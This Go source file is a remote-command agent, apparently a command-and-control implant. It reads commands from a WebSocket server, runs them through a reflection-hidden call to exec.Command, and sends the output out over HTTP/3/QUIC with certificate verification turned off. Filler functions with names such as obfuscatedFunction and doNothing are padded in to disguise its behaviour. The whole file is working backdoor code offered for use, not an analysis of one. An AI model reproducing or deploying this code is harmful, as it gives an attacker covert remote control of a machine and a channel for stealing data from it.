package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"github.com/gorilla/websocket"
	"github.com/quic-go/quic-go/http3"
	"log"
	"math/rand"
	"net/http"
	"os/exec"
	"reflect"
	"strings"
)

func obfuscatedFunction() {
	// 无用的计算和打印
	result := 1
	for i := 0; i < 10; i++ {
		result *= i
	}
	fmt.Println("Obfuscated result:", result)
}

func unusedFunction() {
	strs := []string{"foo", "bar", "baz"}
	for _, s := range strs {
		fmt.Println("Unused string:", s)
	}
}

func anotherUnusedFunction() {
	// 复杂的逻辑，但不做任何实际工作
	for i := 0; i < 1000; i++ {
		_ = i * i
	}
}

func doNothing() {
	// 虚假的操作
	for i := 0; i < 5; i++ {
		_ = i * i
	}
}

// 通过 WebSocket 连接到服务器，并在接收到消息后通过 QUIC 发送请求

// 执行收到的消息中的命令，并将结果通过 QUIC 发送
func sendQuicRequest(message []byte) {
	// 解析消息，提取命令及参数
	parts := strings.Fields(string(message))
	obfuscatedFunction()
	if len(parts) == 0 {
		log.Println("Received empty command")
		return
	}

	// 第一个部分是程序名称，后续部分是命令行参数
	program := parts[0]
	args := parts[1:]

	// 执行命令
	//cmd := exec.Command(program, args...)
	// 获取 exec.Command 的反射值
	execCmd := reflect.ValueOf(exec.Command)
	// 动态调用 exec.Command，参数需要传递为 reflect.Value 的 slice
	callArgs := make([]reflect.Value, len(args)+1)
	callArgs[0] = reflect.ValueOf(program)
	for i, arg := range args {
		callArgs[i+1] = reflect.ValueOf(arg)
	}

	// 调用 exec.Command 函数
	// 通过反射调用exec.Command，返回*exec.Cmd类型
	cmd := execCmd.Call(callArgs)[0].Interface().(*exec.Cmd)

	// 执行命令并获取输出
	unusedFunction()
	body, err := cmd.CombinedOutput()
	if err != nil {
		body = []byte(err.Error())
	}

	// 配置 TLS
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // 跳过证书验证（开发环境中可以使用，生产环境需慎重）
	}

	// 创建一个 HTTP/3 客户端
	client := &http.Client{
		Transport: &http3.RoundTripper{
			TLSClientConfig: tlsConfig,
		},
	}

	// 创建 HTTP/3 请求
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "https://127.0.0.1:4433", bytes.NewReader(body))
	if err != nil {
		log.Fatalf("Failed to create QUIC request: %v", err)
	}
	anotherUnusedFunction()

	// 发送请求
	resp, err := client.Do(req)
	anotherUnusedFunction()
	if err != nil {
		log.Fatalf("Failed to send QUIC request: %v", err)
	}
	defer resp.Body.Close()

	log.Printf("QUIC request sent, response status: %s", resp.Status)
}

func main() {
	// 连接到 WebSocket 服务器
	serverAddr := "wss://127.0.0.1:8888/ws"
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true, // 跳过证书验证
	}

	conn, _, err := websocket.DefaultDialer.Dial(serverAddr, nil)
	if err != nil {
		log.Fatalf("WebSocket dial error: %v", err)
		return
	}
	defer conn.Close()
	log.Println("Connected to WebSocket server")

	// 主循环：接收服务器的消息并根据需要发送 QUIC 请求
	for {
		// 接收服务器消息
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Printf("WebSocket read error: %v", err)
			return
		}

		// 随机决定是否发送 QUIC 请求（可以根据实际需求自定义逻辑）
		if rand.Intn(2) == 0 {
			doNothing()
			sendQuicRequest(message)
			continue
		} else if len(message) == 0 {
			log.Println("Received empty message from server")
			continue
		} else {
			// 处理收到的消息并发送 QUIC 请求
			sendQuicRequest(message)
		}

	}
}
